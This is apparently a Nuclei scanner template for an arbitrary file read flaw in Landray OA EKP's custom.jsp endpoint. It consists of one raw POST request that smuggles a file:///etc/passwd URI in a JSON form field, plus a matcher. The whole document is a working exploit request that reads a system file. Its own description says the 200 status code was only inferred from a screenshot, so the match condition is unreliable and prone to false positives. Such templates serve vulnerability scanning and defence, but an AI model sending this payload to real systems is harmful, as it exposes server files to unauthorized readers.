id: poc-7751dcbf9d5c94c0d961
info:
  name: 蓝凌OAEKPcustom.jsp存在任意文件读取漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: lfi,2025
http:
- raw:
  - 'POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)

    Accept: /

    Connection: Keep-Alive

    Content-Length: 42

    Content-Type: application/x-www-form-urlencoded


    var={"body":{"file":"file:///etc/passwd"}}'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
